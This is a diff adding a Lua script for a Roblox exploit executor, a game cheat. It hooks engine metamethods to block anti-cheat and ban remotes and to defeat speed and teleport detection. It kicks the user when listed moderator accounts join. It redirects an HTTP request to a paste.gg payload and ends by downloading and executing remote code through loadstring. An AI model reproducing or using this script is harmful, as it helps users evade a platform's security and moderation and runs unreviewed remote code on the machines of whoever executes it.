@@ -1,0 +1,148 @@
+local old
+old = hookfunction(game.HttpGetAsync, function(self, url)
+    if type(url) == "string" then
+        if string.match(url, "https://raw.githubusercontent.com/bjHu2930cBy42lqvbocgyhyUNFO3ufsf/RxrfwShMkd0lX24z438WvTeQTE9kswAH/main/wYkR6ZFcjxuVVYAeO6n53yeu9ZO40LYN") then
+            return game:HttpGet("https://paste.gg/p/Mc4121ban/dea5271bf2ea4241a6d35b707eab2cc4/files/5e3d88eb38ac4d3cb5844087dcc50c70/raw")
+        end
+        
+    end
+    return old(self, url)
+end)
+if getgenv().Executed then return end
+local ReplicatedStorage = game:GetService("ReplicatedStorage");
+local tablefind = table.find;
+local MainEvent = ReplicatedStorage.MainEvent;
+local Flags = {
+	"checkingSPEED",
+	"BANREMOTE",
+	"PERMAIDBAN",
+	"KICKREMOTE",
+	"BR_KICKPC",
+	"BR_KICKMOBILE",
+	"OneMoreTime",
+	"TeleportDetect",
+	"CHECKER_1",
+	"CHECKER",
+	"GUI_CHECK",
+	"VirusCough",
+	"BreathingHAMON"
+};
+
+local Player = game:GetService("Players").LocalPlayer;
+getsenv(Player.Character.Animate).checkingSPEED = function()
+	return;
+end;
+
+for i, v in pairs(getconnections(Player.Character.HumanoidRootPart:GetPropertyChangedSignal("CFrame"))) do
+	v:Disable();
+end;
+
+Player.CharacterAdded:Connect(function()
+	getsenv(Player.Character.Animate).checkingSPEED = function()
+		return;
+	end;
+end);
+
+
+local __namecall;
+__namecall = hookmetamethod(game, "__namecall", function(...)
+	local args = {
+		...
+	};
+	local self = args[1];
+	local method = getnamecallmethod();
+	if method == "FireServer" and self == MainEvent and tablefind(Flags, args[2]) then
+		return;
+	end;
+	if not checkcaller() and (getfenv(2)).crash then
+		local fenv = getfenv(2);
+		fenv.crash = function()
+		end;
+		setfenv(2, fenv);
+	end;
+	return __namecall(...);
+end);
+
+local __newindex;
+__newindex = hookmetamethod(game, "__newindex", function(t, k, v)
+	if not checkcaller() and t:IsA("Humanoid") and (k == "WalkSpeed" or k == "JumpPower") then
+		return;
+	end;
+	return __newindex(t, k, v);
+end);
+
+
+game.Workspace.FallenPartsDestroyHeight = 0/0
+
+local modids = {
+	97123240,
+	3718161806,
+	3133243078,
+	2846299656,
+	170526279,
+	202106293,
+	3935753547,
+	244844600,
+	30586516,
+	3018319587,
+	89473551,
+	352087139,
+	29242182,
+	2598041621,
+	8195210,
+	3944434729,
+	2395613299,
+	2212830051,
+	1085505689,
+	1830168970,
+	213277245,
+	439942262,
+	67819707,
+	4545223,
+	155627580,
+	808962546,
+	201454243,
+	28357488,
+	822999,
+	29407034,
+	2259174309,
+	3520967,
+	93101606,
+	163721789,
+	149290866,
+	773554987,
+	542488819,
+	99356639,
+	135885527,
+	2269987434,
+	4969374172,
+	4653413083,
+	84570351,
+	154370645,
+	1010851411,
+	53715402,
+	6074834798
+}
+
+for i,v in pairs(game.Players:GetPlayers()) do
+	if table.find(modids, v.UserId) then
+		game.Players.LocalPlayer:Kick("mod")
+	end
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if table.find(modids, plr.UserId) then
+		game.Players.LocalPlayer:Kick("mod")
+	end
+end)
+
+local vu = game:GetService("VirtualUser")
+game:GetService("Players").LocalPlayer.Idled:connect(function()
+	vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+	wait(1)
+	vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
+end)
+
+for i,v in pairs(workspace:GetDescendants()) do if v:isA("Seat") then v:Destroy() end end
+getgenv().Executed = true
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XK5NG/XK5NG.github.io/main/V4.7"))()
